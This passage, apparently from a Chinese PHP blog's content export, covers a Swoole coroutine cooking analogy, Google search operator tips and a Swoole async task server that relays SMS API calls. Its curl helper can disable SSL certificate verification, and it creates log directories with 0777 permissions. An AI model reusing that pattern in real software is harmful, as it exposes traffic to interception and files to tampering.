WaitGroup();</span><br><span class="line">&#x2F;&#x2F; 保存数据的结果</span><br><span class="line">&#x2F;&#x2F; 装好的菜</span><br><span class="line">$result &#x3D; [];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 记录一下煲汤(记录一个任务)</span><br><span class="line">$wg-&gt;add();</span><br><span class="line">&#x2F;&#x2F; 创建一个煲汤任务(开启一个新的协程)</span><br><span class="line">Coroutine::create(function () use ($wg, &amp;$result) &#123;</span><br><span class="line">echo &quot;开始煲汤...&quot; . PHP_EOL;</span><br><span class="line">&#x2F;&#x2F; 煲汤需要6分钟，所以我们也不用在这里等汤煮好，</span><br><span class="line">&#x2F;&#x2F; 直接去做下一个任务：炒菜(协程切换)</span><br><span class="line">sleep(8);</span><br><span class="line">echo &quot;汤好了...&quot; . PHP_EOL;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 装盘</span><br><span class="line">$result[&#39;soup&#39;] &#x3D; &#39;一锅汤&#39;;</span><br><span class="line">$wg-&gt;done(); &#x2F;&#x2F; 标记任务完成</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 记录一下煮饭(记录一个任务)</span><br><span class="line">$wg-&gt;add();</span><br><span class="line">&#x2F;&#x2F; 创建一个煮饭任务(开启一个新的协程)</span><br><span class="line">Coroutine::create(function () use ($wg, &amp;$result) &#123;</span><br><span class="line">echo &quot;开始煮饭...&quot; . PHP_EOL;</span><br><span class="line">&#x2F;&#x2F; 煮饭需要5分钟，所以我们不用在这里等饭煮熟，放在这里一会再来看看好了没有</span><br><span class="line">&#x2F;&#x2F; 我们先去煲汤(协程切换)</span><br><span class="line">sleep(10);</span><br><span class="line">echo &quot;饭熟了...&quot; . PHP_EOL;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 装盘</span><br><span class="line">$result[&#39;rice&#39;] &#x3D; &#39;一锅米饭&#39;;</span><br><span class="line">$wg-&gt;done(); &#x2F;&#x2F; 标记任务完成</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 记录一下炒菜</span><br><span class="line">$wg-&gt;add();</span><br><span class="line">&#x2F;&#x2F; 创建一个炒菜任务(再开启一个新的协程)</span><br><span class="line">Coroutine::create(function () use ($wg, &amp;$result) &#123;</span><br><span class="line">&#x2F;&#x2F; 煎鱼的过程必须放在一个协程里面执行，如果不是的话可能鱼还没煎好就出锅了</span><br><span class="line">&#x2F;&#x2F; 因为开启协程后，IO全是异步了，在此demo中每次遇到sleep都会挂起当前协程</span><br><span class="line">&#x2F;&#x2F; 切换到下一个协程执行。</span><br><span class="line">&#x2F;&#x2F; 例如把出锅这一步开启一个新协程执行，则在煎鱼的时候鱼，鱼就出锅了。</span><br><span class="line">echo &quot;放油...&quot; . PHP_EOL;</span><br><span class="line">sleep(1);</span><br><span class="line">echo &quot;煎鱼...&quot; . PHP_EOL;</span><br><span class="line">sleep(3);</span><br><span class="line">echo &quot;放盐...&quot; . PHP_EOL;</span><br><span class="line">sleep(1);</span><br><span class="line">echo &quot;出锅...&quot; . PHP_EOL;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 装盘</span><br><span class="line">$result[&#39;food&#39;] &#x3D; &#39;鱼香肉丝&#39;;</span><br><span class="line">$wg-&gt;done();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 等待全部任务完成</span><br><span class="line">$wg-&gt;wait();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 返回数据(上菜！)</span><br><span class="line">var_dump($result);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">var_dump(&#39;总耗时：&#39; . (time() - $startTime) . &#39; 分钟&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$cooker &#x3D; new Cook();</span><br><span class="line">$cooker-&gt;cookByCo();</span><br></pre></td></tr></table></figure><p>通过执行代码可以看到协程方式比传统阻塞方式足足快了十三分钟。从协程方式实现的逻辑中可以看到，通过无感知编写”同步代码“，却实现了异步 I/O 的效果和性能。避免了传统异步回调所带来的离散的代码逻辑和陷入多层回调中导致代码无法维护。</p><p>不过需要注意的是传统回调的触发条件是<strong>回调函数</strong>，而协程切换的条件是<strong>遇到 I/O</strong>。</p><h3 id="协程误区"><a href="#协程误区" class="headerlink" title="协程误区"></a>协程误区</h3><p>实际使用协程时，需要注意以下几个误区，否则效果可能会事倍功半。</p><p>理论上来讲，协程解决的是 I/O 复用的问题，对于计算密集的问题无效。</p><ul><li>如果cpu很闲(大部分时间都消耗在网络磁盘上了)，协程就可以提高cpu的利用率</li><li>如果cpu本身就很饱和了 用协程反而会降低cpu利用率（需要花时间来做协程调度）。</li><li>swoole 是单线程</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://learnku.com/articles/44836" target="_blank" rel="noopener">swoole 学习笔记-做一顿饭来理解协程</a></li><li><a href="https://www.easyswoole.com/Cn/NoobCourse/coroutine.html" target="_blank" rel="noopener">协程-EasySwoole</a></li><li><a href="https://xiaoxiami.gitbook.io/swoole/swoole-ji-chu/jin-cheng-nei-cun-xie-cheng/swoole-xie-cheng" target="_blank" rel="noopener">swoole 协程-swoole 高手之路</a></li><li><a href="https://segmentfault.com/q/1010000021755294" target="_blank" rel="noopener">swoole一个协程问题？为什么效率变慢了</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Swoole </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何高效的利用谷歌搜索引擎</title>
      <link href="/how-to-use-google-search-engine-efficiently/"/>
      <url>/how-to-use-google-search-engine-efficiently/</url>
      
        <content type="html"><![CDATA[<p>整理这篇笔记的目的是整理那些不太常用但又十分有用的Google 搜索引擎搜索技巧。</p><a id="more"></a><h3 id="搜索完全匹配的搜索结果"><a href="#搜索完全匹配的搜索结果" class="headerlink" title="搜索完全匹配的搜索结果"></a>搜索完全匹配的搜索结果</h3><p>有时候我们会有这样一种需求：我需要查找某个关键字同时出现的内容，该怎么做呢？<br>这个时候就需要用到完全匹配这招了。</p><p>在关键字的左右两边分别加上<code>&quot;</code>英文状态的双引号，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;HHKB 是什么&quot;</span><br></pre></td></tr></table></figure><h3 id="从搜索结果中排除特定词"><a href="#从搜索结果中排除特定词" class="headerlink" title="从搜索结果中排除特定词"></a>从搜索结果中排除特定词</h3><p>为了进一步筛选搜索结果，还需要学会另一招，利用<code>-</code>减号排除特定关键字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;the most important benefit of education&quot;-&quot;unitedstates&quot;</span><br></pre></td></tr></table></figure><p>上面这段表示的意思是：要求Google 返回含有”the most important benefit of education” 但不存在”unitedstates”的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">daddy -film</span><br></pre></td></tr></table></figure><p>daddy 的意思是父亲，同时也是一部电影，当你搜索”daddy” 时，谷歌只返回有关电影的内容。如果你只想搜索时关于父亲，要排除电影，在需要排除的前面加上<code>-</code>，例如上面所示。你会发现结果中没有与电影有关的内容。</p><h3 id="搜索通配符或未知字词"><a href="#搜索通配符或未知字词" class="headerlink" title="搜索通配符或未知字词"></a>搜索通配符或未知字词</h3><p>怎样用？</p><p>即搜索字符串中可以包含星号<code>*</code>，用星号来替代任意字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powerful*life</span><br></pre></td></tr></table></figure><h3 id="搜索社交媒体"><a href="#搜索社交媒体" class="headerlink" title="搜索社交媒体"></a>搜索社交媒体</h3><p>当你只想在某个社交媒体里找到相关字词时，在用于搜索社交媒体的字词前加上<code>@</code>，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@twice</span><br></pre></td></tr></table></figure><h3 id="组合搜索"><a href="#组合搜索" class="headerlink" title="组合搜索"></a>组合搜索</h3><p>在各个搜索查询字间加上“OR”关键字，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">race OR marathon</span><br></pre></td></tr></table></figure><p>搜索到的结果会返回关于 race 或者 marathon，或两者均有的相关内容。</p><h3 id="搜索特定价格"><a href="#搜索特定价格" class="headerlink" title="搜索特定价格"></a>搜索特定价格</h3><p>用这个方法来搜索特定价格的商品，例如想要搜索价格为<code>$200</code>的书包，可以这样搜索：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$200 bag</span><br></pre></td></tr></table></figure><h3 id="在某个数字范围内执行搜索"><a href="#在某个数字范围内执行搜索" class="headerlink" title="在某个数字范围内执行搜索"></a>在某个数字范围内执行搜索</h3><p>比如想要搜索介于 $100 - $200 之间的商品，或者是 10kg - 20kg 的某种东西，亦或者是 1900 - 1945 年发生的事情，等等。</p><p>在两个数字之间加上<code>..</code>符号，例如搜索价格 $50 - $100 的桌子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">amazon table $50..$100</span><br></pre></td></tr></table></figure><h3 id="搜索特定网站"><a href="#搜索特定网站" class="headerlink" title="搜索特定网站"></a>搜索特定网站</h3><p>只在特定的网站里搜索相关资料，在相应的域名前面加上<code>&quot;site:&quot;</code>，例如要在 youtube 里找关于猫的电影，可以这样搜索：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:youtube.com cat</span><br></pre></td></tr></table></figure><h3 id="搜索相关网站"><a href="#搜索相关网站" class="headerlink" title="搜索相关网站"></a>搜索相关网站</h3><p>想找和某个网站有关系或者相似特质的网站，在已知网址前面加上<code>related:</code>，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">related:google.com</span><br></pre></td></tr></table></figure><p>google.com 是一个搜索网站，加上<code>related:</code>关键字之后，搜索的结果是其他搜索引擎，如 Yahoo、Bing 等</p><h3 id="寻找主题标记"><a href="#寻找主题标记" class="headerlink" title="寻找主题标记"></a>寻找主题标记</h3><p>在关键字前面加上<code>#</code>符号，</p><h3 id="获取网站的相关资料"><a href="#获取网站的相关资料" class="headerlink" title="获取网站的相关资料"></a>获取网站的相关资料</h3><p>如果你想知道某个网站是关于什么的，可以这样子搜索：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info:baidu.com</span><br></pre></td></tr></table></figure><h3 id="多组合运用"><a href="#多组合运用" class="headerlink" title="多组合运用"></a>多组合运用</h3><ol><li>在 channelnewsasia.com 网站里搜索关于天灾的意外，除了地震，发生在2012年到2016年之间。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:channelnewsasia.com ~accident &quot;natural disaster&quot; -earthquake 2012..2016</span><br></pre></td></tr></table></figure><p>其中波浪符号<code>~</code>表示也搜索和这个字有关联的内容，如 failure，crash、mishap 等</p><ol start="2"><li><p>从两个购物网站搜索手表，价格在 $100 到 $200 之间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:shopee.com.my OR site:amazon.com watch $100..$200</span><br></pre></td></tr></table></figure></li><li><p>从ebay 与 amazon网站搜索苹果与微软的产品，排除平板电脑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:ebay.com OR site:amazon.com apple OR microsoft -tablet</span><br></pre></td></tr></table></figure></li><li><p>在吉隆坡一带搜索低收费住宿，价格在$100 到 $200 之间，排除 airbnb，靠近轻快地铁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KL ~budget~accommodation $100..$200 -airbnb &quot;nearby LRT station&quot;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Skill </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Skill </tag>
            
            <tag> Google Search </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP + Swoole 实现异步任务队列</title>
      <link href="/php-swoole-to-achieve-asynchronous-task-queue/"/>
      <url>/php-swoole-to-achieve-asynchronous-task-queue/</url>
      
        <content type="html"><![CDATA[<p>最近接手一个对接短信的需求，这个需求本身并没有什么难度，直接按照服务商的要求请求具体的接口就好了。</p><a id="more"></a><p>最开始是使用传统的同步阻塞方式实现了一遍，用户体验并不好，发送短信需要等待，等待服务商的接口返回内容，才继续向下执行。</p><p>因为最近在学习<a href="https://swoole.com/" target="_blank" rel="noopener">Swoole</a>，Swoole 中有一个“<a href="https://wiki.swoole.com/#/start/start_task?id=%E6%89%A7%E8%A1%8C%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1task" target="_blank" rel="noopener">异步任务</a>”，就特别适合以下应用场景：</p><ol><li>需要执行耗时操作，会阻塞主进程</li><li>用户不需要等待返回结果</li></ol><p>结合官网手册和<a href="https://learnku.com/blog/pltrue" target="_blank" rel="noopener">Latent</a> 的<a href="https://learnku.com/articles/43752" target="_blank" rel="noopener">基于 swoole 下 异步消息队列 API</a>，最终简单封装了一个处理API 的类，实现如下：</p><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>服务端是基于本地Tcp，监听<code>9501</code>端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class taskServer&#123;</span><br><span class="line">const HOST &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">const PORT &#x3D; 9501;</span><br><span class="line">public $server &#x3D; null;</span><br><span class="line"></span><br><span class="line">public function __construct()</span><br><span class="line">&#123;</span><br><span class="line">$this-&gt;server &#x3D; new SWoole\Server(self::HOST, self::PORT);</span><br><span class="line">$this-&gt;server-&gt;set(array(</span><br><span class="line">&quot;enable_coroutine&quot; &#x3D;&gt; false,     &#x2F;&#x2F; 关闭协程</span><br><span class="line">&quot;worker_num&quot; &#x3D;&gt; 2,               &#x2F;&#x2F; 开启的进程数 一般为cup核数 1-4 倍</span><br><span class="line">&quot;task_worker_num&quot; &#x3D;&gt; 2,          &#x2F;&#x2F; task进程的数量</span><br><span class="line">&#39;daemonize&#39; &#x3D;&gt; true,             &#x2F;&#x2F; 以守护进程的方式启动</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 注册事件</span><br><span class="line">$this-&gt;server-&gt;on(&quot;connect&quot;, [$this, &quot;onConnect&quot;]);</span><br><span class="line">$this-&gt;server-&gt;on(&quot;receive&quot;, [$this, &quot;onReceive&quot;]);</span><br><span class="line">$this-&gt;server-&gt;on(&quot;close&quot;, [$this, &quot;onClose&quot;]);</span><br><span class="line">$this-&gt;server-&gt;on(&quot;task&quot;, [$this, &quot;onTask&quot;]);</span><br><span class="line">$this-&gt;server-&gt;on(&quot;finish&quot;, [$this, &quot;onFinish&quot;]);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 启用服务</span><br><span class="line">$this-&gt;server-&gt;start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 监听连接事件</span><br><span class="line"> * @param $server</span><br><span class="line"> * @param $fd</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function onConnect($server, $fd)&#123;</span><br><span class="line">echo &quot;连接成功&quot;.PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 监听客户端发送的消息</span><br><span class="line"> * @param $server       &quot;Server 对象&quot;</span><br><span class="line"> * @param $fd           &quot;唯一标示&quot;</span><br><span class="line"> * @param $form_id</span><br><span class="line"> * @param $data         &quot;客户端发送的数据&quot;</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function onReceive($server, $fd, $form_id, $data)&#123;</span><br><span class="line">&#x2F;&#x2F; 投递任务</span><br><span class="line">$server-&gt;task($data);</span><br><span class="line">$server-&gt;send($fd, &quot;这是客户端向服务端发送的信息：&#123;$data&#125;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 监听异步任务task事件</span><br><span class="line"> * @param $server</span><br><span class="line"> * @param $task_id</span><br><span class="line"> * @param $worker_id</span><br><span class="line"> * @param $data</span><br><span class="line"> * @return string</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function onTask($server, $task_id, $worker_id, $data)&#123;</span><br><span class="line">$data &#x3D; json_decode($data, true);</span><br><span class="line">echo &quot;开始执行异步任务&quot;.PHP_EOL;</span><br><span class="line">try &#123;</span><br><span class="line">&#x2F;&#x2F; 开始执行任务</span><br><span class="line">$this-&gt;addLog(date(&#39;Y-m-d H:i:s&#39;).&quot;开始执行任务&quot;.PHP_EOL );</span><br><span class="line">&#x2F;&#x2F; 通知worker（必须 return，否则不会调用 onFinish）</span><br><span class="line">return $this-&gt;curl($data[&#39;url&#39;], $data[&#39;data&#39;], $data[&#39;type&#39;]);</span><br><span class="line">&#125; catch (Exception $exception) &#123;</span><br><span class="line">&#x2F;&#x2F; 执行任务失败</span><br><span class="line">$this-&gt;addLog(date(&#39;Y-m-d H:i:s&#39;).&quot;执行任务失败&quot;.PHP_EOL);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 监听finish 事件</span><br><span class="line"> * @param $server</span><br><span class="line"> * @param $task_id</span><br><span class="line"> * @param $data</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function onFinish($server, $task_id, $data)&#123;</span><br><span class="line">$this-&gt;addLog(date(&quot;Y-m-d H:i:s&quot;).&quot;异步任务执行完成&quot;.PHP_EOL);</span><br><span class="line">print_r( &quot;来自服务端的消息：&#123;$data&#125;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 监听关闭连接事件</span><br><span class="line"> * @param $server</span><br><span class="line"> * @param $fd</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function onClose($server, $fd)&#123;</span><br><span class="line">echo &quot;关闭TCP 连接&quot;.PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 发起Get 或 Post 请求</span><br><span class="line"> * @param string $url           请求地址</span><br><span class="line"> * @param array $request_data   请求参数</span><br><span class="line"> * @param string $request_type  请求类型</span><br><span class="line"> * @param array $headers        头信息</span><br><span class="line"> * @param bool $is_ssl          是否是ssl</span><br><span class="line"> * @return bool|string</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function curl($url &#x3D; &#39;&#39;, $request_data &#x3D; [], $request_type &#x3D; &#39;get&#39;, $headers &#x3D; [], $is_ssl &#x3D; false)</span><br><span class="line">&#123;</span><br><span class="line">$curl &#x3D; curl_init (); &#x2F;&#x2F; 初始化</span><br><span class="line">&#x2F;&#x2F; 设置 URL</span><br><span class="line">curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">&#x2F;&#x2F; 不返回 Response 头部信息</span><br><span class="line">curl_setopt ( $curl, CURLOPT_HEADER, 0 );</span><br><span class="line">&#x2F;&#x2F; 如果成功只将结果返回，不自动输出任何内容</span><br><span class="line">curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, 1 );</span><br><span class="line">&#x2F;&#x2F; 设置请求参数</span><br><span class="line">curl_setopt ( $curl, CURLOPT_POSTFIELDS, http_build_query($request_data));</span><br><span class="line">&#x2F;&#x2F; TRUE 时追踪句柄的请求字符串</span><br><span class="line">curl_setopt($curl, CURLINFO_HEADER_OUT, true);</span><br><span class="line">&#x2F;&#x2F; Post 类型增加以下处理</span><br><span class="line">if( $request_type &#x3D;&#x3D; &#39;post&#39;) &#123;</span><br><span class="line">&#x2F;&#x2F; 设置为POST方式</span><br><span class="line">curl_setopt ( $curl, CURLOPT_POST, 1 );</span><br><span class="line">&#x2F;&#x2F; 设置头信息</span><br><span class="line">curl_setopt($curl, CURLOPT_HTTPHEADER, array(&#39;Content-Type: application&#x2F;json&#39;, &#39;Content-Length:&#39; . strlen(json_encode($request_data))));</span><br><span class="line">&#x2F;&#x2F; 设置请求参数</span><br><span class="line">curl_setopt ( $curl, CURLOPT_POSTFIELDS, json_encode($request_data));</span><br><span class="line">&#x2F;&#x2F; 当POST 数据大于1024 时强制执行</span><br><span class="line">curl_setopt ( $curl, CURLOPT_HTTPHEADER, array(&quot;Expect:&quot;));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 判断是否绕过证书</span><br><span class="line">if( $is_ssl ) &#123;</span><br><span class="line">&#x2F;&#x2F;绕过ssl验证</span><br><span class="line">curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);</span><br><span class="line">curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);</span><br><span class="line">&#125;</span><br><span class="line">if(!empty($headers))  curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);</span><br><span class="line">&#x2F;&#x2F; 执行</span><br><span class="line">$result &#x3D; curl_exec ( $curl );</span><br><span class="line">if ( $result &#x3D;&#x3D; FALSE) return false;</span><br><span class="line">&#x2F;&#x2F; 关闭资源</span><br><span class="line">curl_close ( $curl );</span><br><span class="line">return $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 写入日志</span><br><span class="line"> * @param $content</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function addLog($content)&#123;</span><br><span class="line">$path &#x3D; dirname(__FILE__).&quot;&#x2F;logs&#x2F;&quot;;</span><br><span class="line">if (!is_dir($path))</span><br><span class="line">mkdir($path,0777,true);</span><br><span class="line"></span><br><span class="line">$file_name &#x3D; $path.date(&quot;Y_m_d&quot;) . &quot;.log&quot;;</span><br><span class="line">if (!file_exists($file_name)) &#123;</span><br><span class="line">touch($file_name);</span><br><span class="line">chown($file_name, &quot;root&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file_log &#x3D; fopen($file_name, &quot;a&quot;);</span><br><span class="line">fputs($file_log, $content);</span><br><span class="line">fclose($file_log);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$server &#x3D; new taskServer();</span><br></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>这里的客户端可以是 cli 脚本，也可以是对应控制器中的具体方法，只要能连接Swoole 监听的Tcp 就行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\admin\controller;</span><br><span class="line"></span><br><span class="line">class Index extends Base</span><br><span class="line">&#123;</span><br><span class="line">    public function index()&#123;</span><br><span class="line">        $client &#x3D; new \Swoole\Client(SWOOLE_SOCK_TCP);</span><br><span class="line">      if (!$client-&gt;connect(&#39;0.0.0.0&#39;, 9501)) &#123;</span><br><span class="line">      return json(&quot;connect failed. Error: &#123;$client-&gt;errCode&#125;\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      $data &#x3D; [</span><br><span class="line">  &quot;url&quot; &#x3D;&gt; &quot;https:&#x2F;&#x2F;api.paasoo.com&#x2F;json&quot;,</span><br><span class="line">  &quot;data&quot; &#x3D;&gt; [</span><br><span class="line">  &quot;key&quot; &#x3D;&gt; &quot;key&quot;,</span><br><span class="line">  &quot;secret&quot; &#x3D;&gt; &quot;secret&quot;,</span><br><span class="line">  &quot;from&quot; &#x3D;&gt; &quot;sms&quot;,</span><br><span class="line">  &quot;to&quot; &#x3D;&gt; &quot;mobile_phone&quot;,</span><br><span class="line">  &quot;text&quot; &#x3D;&gt; &quot;test&quot;,</span><br><span class="line">  ],</span><br><span class="line">  &quot;type&quot; &#x3D;&gt; &quot;get&quot;</span><br><span class="line">  ];</span><br><span class="line">    $client-&gt;send(json_encode($data));</span><br><span class="line">    return json($client-&gt;recv());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.phpernote.com/php-function/1450.html" target="_blank" rel="noopener">php使用Swoole来实现实时异步任务队列</a></li><li><a href="https://learnku.com/articles/43752" target="_blank" rel="noopener">基于 swoole 下 异步消息队列 API</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Swoole </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 的四种设置回调函数的方式</title>
      <link href="/php-s-four-ways-to-set-callback-functions/"/>
      <url>/php-s-four-ways-to-set-callback-functions/</url>
      
